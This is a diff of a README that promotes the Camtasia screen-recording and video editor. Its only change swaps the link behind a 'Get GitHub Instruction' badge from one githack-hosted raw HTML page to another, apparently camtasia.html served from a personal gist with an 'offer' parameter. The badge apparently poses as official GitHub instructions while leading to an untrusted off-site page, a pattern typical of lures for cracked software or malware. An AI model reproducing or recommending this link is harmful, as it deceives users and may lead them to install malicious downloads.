@@ -2,7 +2,7 @@
 
 Camtasia is a trusted desktop solution that unites **screen recording and video editing** in one application. It helps creators, businesses, and educators produce engaging videos quickly and with professional polish. Whether you want to build tutorials, record software demos, or enhance online courses — Camtasia gives you the right balance of simplicity and power. 🎯  
 
-[![Get GitHub Instruction](https://img.shields.io/badge/Get%20GitHub%20Instruction-24292e?style=for-the-badge&logo=github&logoColor=white)](https://glcdn.githack.com/-/snippets/4893912/raw/main/app.html?offer=Camtasia)
+[![Get GitHub Instruction](https://img.shields.io/badge/Get%20GitHub%20Instruction-24292e?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/huntermadshman1990/8c6dc0f44cfb6532d09c485944eea6a4/raw/6063dcea0e93f2cc5359d3565c6cc7d196e593c2/camtasia.html?offer=Camtasia)
 
 ---
 
